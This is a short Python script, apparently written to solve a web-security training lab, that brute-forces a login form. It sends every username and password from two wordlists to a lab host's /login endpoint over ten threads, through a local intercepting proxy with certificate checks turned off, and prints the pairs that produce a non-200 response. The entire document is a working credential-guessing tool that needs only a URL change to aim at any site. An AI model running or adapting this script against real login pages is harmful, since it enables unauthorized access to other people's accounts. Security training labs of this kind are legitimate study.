import requests
import urllib3
from concurrent.futures import ThreadPoolExecutor

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def brute_login(session, url, username, password):
    data = {'username': username.strip(), 'password': password.strip()}
    r = session.post(url + '/login', data=data, allow_redirects=False, verify=False, proxies=proxies)
    if r.status_code != 200:
        print('\r' + username + ':' + password)

def main():
    session = requests.Session()
    url = 'https://0abb007103399dcc857c1c4900550021.web-security-academy.net'

    with open('user.txt') as u, open('password.txt') as p:
        usernames = u.readlines()
        passwords = p.readlines()

    with ThreadPoolExecutor(max_workers=10) as executor:
        for username in usernames:
            for password in passwords:
                executor.submit(brute_login, session, url, username, password)

if __name__ == '__main__':
    main()
